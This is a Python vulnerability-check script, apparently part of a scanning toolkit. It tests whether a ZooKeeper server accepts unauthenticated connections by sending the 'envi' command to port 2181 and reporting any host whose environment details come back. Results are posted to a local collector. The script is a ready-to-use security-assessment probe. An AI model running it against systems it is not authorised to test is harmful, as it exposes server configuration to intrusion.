#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: zookeeper 未授权漏洞
referer: https://www.secpulse.com/archives/61101.html
author: Lucifer
description: Zookeeper的默认开放端口是2181。Zookeeper安装部署之后默认情况下不需要任何身份验证，
            造成攻击者可以远程利用Zookeeper，通过服务器收集敏感信息或者在Zookeeper集群内进行破坏（比如：kill命令）。
            攻击者能够执行所有只允许由管理员运行的命令。。
'''
import sys
import socket
import warnings
from termcolor import cprint
from urllib.parse import urlparse
import requests
class zookeeper_unauth_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        port = 2181
        if r"http" in self.url:
            #提取host
            host = urlparse(self.url)[1]
            try:
                port = int(host.split(':')[1])
            except:
                pass
            flag = host.find(":")
            if flag != -1:
                host = host[:flag]
        else:
            if self.url.find(":") >= 0:
                host = self.url.split(":")[0]
                port = int(self.url.split(":")[1])
            else:
                host = self.url

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(6)
            s.connect((host, port))
            s.send(b'envi')
            data = s.recv(1024).decode()
            if r"Environment" in data and r"zookeeper" in data:
                cprint("[+]存在zookeeper 未授权漏洞...(高危)\tpayload: "+host+":"+str(port), "red")
                postdata = {self.url:"[+]存在zookeeper 未授权漏洞...(高危)\tpayload: "+host+":"+str(port)}
                requests.post('http://localhost:8848/system', json=postdata) 
            else:
                cprint("[-]不存在zookeeper_unauth漏洞", "white", "on_grey")

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = zookeeper_unauth_BaseVerify(sys.argv[1])
    testVuln.run()
